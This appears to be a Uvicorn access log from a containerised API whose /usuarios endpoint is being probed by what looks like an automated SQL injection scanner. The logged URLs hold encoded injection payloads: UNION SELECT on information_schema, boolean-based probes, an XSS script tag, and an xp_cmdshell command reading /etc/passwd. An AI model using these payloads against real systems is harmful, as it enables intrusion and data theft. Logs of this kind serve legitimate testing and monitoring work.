api-1  | INFO:     Started server process [1]
api-1  | INFO:     Waiting for application startup.
api-1  | INFO:     Application startup complete.
api-1  | INFO:     Uvicorn running on http://0.0.0.0:8000 (Press CTRL+C to quit)
api-1  | INFO:     172.18.0.1:59220 - "GET /usuarios HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59236 - "GET /usuarios?LJNG=7092%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59248 - "GET /usuarios HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59264 - "GET /6579 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59274 - "GET /usuarios..%2C%2C%29%27..%22%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59282 - "GET /usuarios%27VEZIWa%3C%27%22%3Evvaiow HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59298 - "GET /usuarios HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59294 - "GET /usuarios%29/%2A%2A/AND/%2A%2A/2535%3D4861/%2A%2A/AND/%2A%2A/%288603%3D8603 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59310 - "GET /usuarios%29/%2A%2A/AND/%2A%2A/9610%3D9610/%2A%2A/AND/%2A%2A/%281434%3D1434 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59326 - "GET /usuarios/%2A%2A/AND/%2A%2A/4122%3D3404 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59332 - "GET /usuarios/%2A%2A/AND/%2A%2A/9610%3D9610 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59344 - "GET /usuarios%27%29/%2A%2A/AND/%2A%2A/1102%3D4632/%2A%2A/AND/%2A%2A/%28%27vRsO%27%3D%27vRsO HTTP/1.1" 404 Not Found
